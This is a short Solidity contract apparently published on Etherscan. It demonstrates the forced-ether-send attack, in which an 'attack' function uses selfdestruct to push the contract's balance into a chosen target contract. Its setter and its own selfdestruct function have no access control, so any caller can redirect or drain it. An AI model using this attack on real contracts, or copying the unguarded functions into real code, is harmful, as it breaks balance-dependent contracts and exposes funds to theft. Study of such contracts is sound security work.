/**
 *Submitted for verification at Etherscan.io on 2022-09-01
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.7.6;


contract SelfDestruct {

    address public otherContract;
    uint256 public valor = 20;

    constructor(address _otherContract) {                
        otherContract = _otherContract;
    }

    function setOtherContract(address _otherContract) external {
        otherContract = _otherContract;
    }
    
    function attack() public payable {
        // call attack and send ether
        // cast address to payable
        address payable addr = payable(address(otherContract));
        selfdestruct(addr);
    }

    function transferToContract(uint256 _value) public payable {
        address payable receiver = payable(otherContract);        
        receiver.transfer(_value);
    }

    function selfDestruct() external {
        selfdestruct(msg.sender);
    }

    receive() external payable {   
    }
}